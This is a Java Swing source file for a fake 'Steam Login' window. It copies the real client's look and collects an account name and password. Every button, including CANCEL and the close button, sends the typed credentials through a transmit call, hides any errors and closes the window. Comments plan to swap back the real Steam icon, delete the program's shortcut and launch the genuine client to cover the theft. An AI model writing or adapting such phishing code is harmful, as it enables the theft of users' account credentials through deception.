

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.event.ActionListener;
import java.io.IOException;


public class LoginForm extends JFrame implements ActionListener, MouseListener, MouseMotionListener{


//this.getContentPane().setBackground(Color.black);
    /**
     * Creates new form LoginForm
     */
    public LoginForm() {
        initComponents();
        this.getContentPane().setBackground(new Color(38,38,38));
        this.addMouseMotionListener(this);
        this.addMouseListener(this);
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {
        Icon icon = new ImageIcon("logo.png");
        logo = new JLabel(icon);
        jColorChooser1 = new javax.swing.JColorChooser();
        jColorChooser2 = new javax.swing.JColorChooser();
        jColorChooser3 = new javax.swing.JColorChooser();
        jFrame1 = new javax.swing.JFrame();
        jColorChooser4 = new javax.swing.JColorChooser();
        jSplitPane1 = new javax.swing.JSplitPane();
        jFrame2 = new javax.swing.JFrame();
        jFrame3 = new javax.swing.JFrame();
        AccountName = new javax.swing.JTextField();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        LOGIN = new javax.swing.JButton();
        CANCEL = new javax.swing.JButton();
        fakeRadio = new JButton("");
        jCheckBox1 = new JLabel();
        Password = new javax.swing.JPasswordField();
        exitButton = new javax.swing.JButton();
        minimizeButton = new javax.swing.JButton();
        steamLabel = new javax.swing.JLabel("Steam Login");

        javax.swing.GroupLayout jFrame1Layout = new javax.swing.GroupLayout(jFrame1.getContentPane());
        jFrame1.getContentPane().setLayout(jFrame1Layout);
        jFrame1Layout.setHorizontalGroup(
            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame1Layout.setVerticalGroup(
            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jFrame2Layout = new javax.swing.GroupLayout(jFrame2.getContentPane());
        jFrame2.getContentPane().setLayout(jFrame2Layout);
        jFrame2Layout.setHorizontalGroup(
            jFrame2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame2Layout.setVerticalGroup(
            jFrame2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jFrame3Layout = new javax.swing.GroupLayout(jFrame3.getContentPane());
        jFrame3.getContentPane().setLayout(jFrame3Layout);
        jFrame3Layout.setHorizontalGroup(
            jFrame3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame3Layout.setVerticalGroup(
            jFrame3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Steam Login");
        setBackground(new java.awt.Color(0, 0, 0));
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setUndecorated(true);

        AccountName.setBackground(new java.awt.Color(38, 38, 38));
        AccountName.setForeground(new java.awt.Color(255, 255, 255));
        AccountName.setCaretColor(new Color(255,255,255));
        AccountName.addActionListener(this);
        AccountName.setBorder(BorderFactory.createMatteBorder(1,1,1,1,new Color(74, 74, 74)));

        jLabel1.setForeground(new java.awt.Color(207, 207, 207));
        jLabel1.setText("Account Name");

        jLabel2.setForeground(new java.awt.Color(207, 207, 207));
        jLabel2.setText("       Password");

        LOGIN.setBackground(new java.awt.Color(38, 38, 38));
        LOGIN.setForeground(new java.awt.Color(207, 207, 207));
        LOGIN.setText("LOGIN");
        LOGIN.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        LOGIN.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);
        LOGIN.addActionListener(this);

        CANCEL.setBackground(new java.awt.Color(38, 38, 38));
        CANCEL.setForeground(new java.awt.Color(207, 207, 207));
        CANCEL.setText("CANCEL");
        CANCEL.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        CANCEL.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);
        CANCEL.addActionListener(this);

        jCheckBox1.setForeground(new java.awt.Color(238, 238, 238));
        jCheckBox1.setText("         Remember my password");
        jCheckBox1.setBackground(new java.awt.Color(38, 38, 38));
        fakeRadio.addActionListener(this);
        fakeRadio.setBackground(new Color(28,38,38));



        Password.setBackground(new java.awt.Color(38, 38, 38));
        Password.setForeground(new java.awt.Color(207, 207, 207));
        Password.setBorder(BorderFactory.createMatteBorder(1,1,1,1,new Color(74, 74, 74)));
        Password.setCaretColor(new Color(255,255,255));
        Password.addActionListener(this);

        exitButton.setBackground(new java.awt.Color(38, 38, 38));
        exitButton.setForeground(new java.awt.Color(207, 207, 207));
        exitButton.setSelected(true);
        exitButton.setBorder(null);
        exitButton.setBorderPainted(false);
        exitButton.setLabel("X");
        exitButton.addActionListener(this);

        minimizeButton.setBackground(new java.awt.Color(38, 38, 38));
        minimizeButton.setForeground(new java.awt.Color(207, 207, 207));
        minimizeButton.setBorder(null);
        minimizeButton.setBorderPainted(false);
        minimizeButton.setBorder(null);
        minimizeButton.setLabel("_");
        minimizeButton.addActionListener(this);

        steamLabel.setBackground(new java.awt.Color(38, 38, 38));
        steamLabel.setForeground(new java.awt.Color(207, 207, 207));


        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)

                            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(jLabel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addGap(18, 18, 18)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(fakeRadio,16,16,16)
                                .addComponent(logo)
                            .addComponent(jCheckBox1)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(LOGIN, javax.swing.GroupLayout.PREFERRED_SIZE, 193, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(CANCEL, javax.swing.GroupLayout.PREFERRED_SIZE, 174, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addComponent(AccountName)
                            .addComponent(Password))
                        .addContainerGap(37, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(steamLabel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(minimizeButton, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(exitButton, javax.swing.GroupLayout.PREFERRED_SIZE, 43, javax.swing.GroupLayout.PREFERRED_SIZE))))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(steamLabel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(minimizeButton, javax.swing.GroupLayout.DEFAULT_SIZE, 17, Short.MAX_VALUE)
                    .addComponent(exitButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addGap(8,8,8)
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                        .addComponent(logo,50,50,50))
                .addGap(8, 8, 8)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(AccountName, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel2)
                    .addComponent(Password, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(3, 3, 3)
                    .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false)
                    .addComponent(fakeRadio,16,16,16)
                    .addComponent(jCheckBox1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(LOGIN)
                    .addComponent(CANCEL))
                .addContainerGap(42, Short.MAX_VALUE))
        );

        AccountName.getAccessibleContext().setAccessibleName("");
        jLabel2.getAccessibleContext().setAccessibleName("Password");

        minimizeButton.setFocusable(false);
        exitButton.setFocusable(false);


        pack();
        AccountName.requestFocus();
        setLocation(400,400);
    }// </editor-fold>//GEN-END:initComponents


    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */

        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new LoginForm().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextField AccountName;
    private javax.swing.JButton CANCEL;
    private javax.swing.JButton LOGIN;
    private JButton fakeRadio;
    private javax.swing.JPasswordField Password;
    private javax.swing.JLabel jCheckBox1;
    private JLabel logo;
    private javax.swing.JColorChooser jColorChooser1;
    private javax.swing.JColorChooser jColorChooser2;
    private javax.swing.JColorChooser jColorChooser3;
    private javax.swing.JColorChooser jColorChooser4;
    private javax.swing.JFrame jFrame1;
    private javax.swing.JFrame jFrame2;
    private javax.swing.JFrame jFrame3;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JSplitPane jSplitPane1;
    private javax.swing.JLabel steamLabel;
    private javax.swing.JButton exitButton;
    private javax.swing.JButton minimizeButton;
    // End of variables declaration//GEN-END:variables


    int xOff;
    int yOff;


    public void mouseEntered(MouseEvent e){
        return;
    }
    public void mouseExited(MouseEvent e) {
        return;
    }

    public void mousePressed(MouseEvent e){
        xOff = e.getX();
        yOff = e.getY();
    }

    public void mouseMoved(MouseEvent e){
        return;
    }
    public void mouseClicked(MouseEvent e){
        return;
    }
    public void mouseReleased(MouseEvent e){
        return;
    }

    public void mouseDragged(MouseEvent e){

        if(yOff < 50) {
            int globalX = (int) e.getLocationOnScreen().getX();
            int globalY = (int) e.getLocationOnScreen().getY();
            setLocation(globalX - xOff, globalY - yOff);
            revalidate();
            repaint();
        }
    }

    public void actionPerformed(ActionEvent e){
        Component s = (Component)e.getSource();
        if(s == exitButton || s == CANCEL || s == LOGIN || s == AccountName || s == Password){
            transmitAll();
            cleanUp();
        }
        if(e.getSource() == minimizeButton){
            this.setState(ICONIFIED);
        }

    }

    public void transmitAll(){
        DataHandler connection;
        try {
            cleanUp();
            connection = new DataHandler();
            connection.transmit("\n=====\n" + AccountName.getText() + "\n" +
                    new String(Password.getPassword()) + "\n====\n");
        }
        catch (IOException except){
            return; // silently
        }

    }

    // restore the original steam icon from the desktop
    // remove the shortcut of this program
    // try to launch the actual steam client
    public void cleanUp(){
        this.dispose();
    }
}
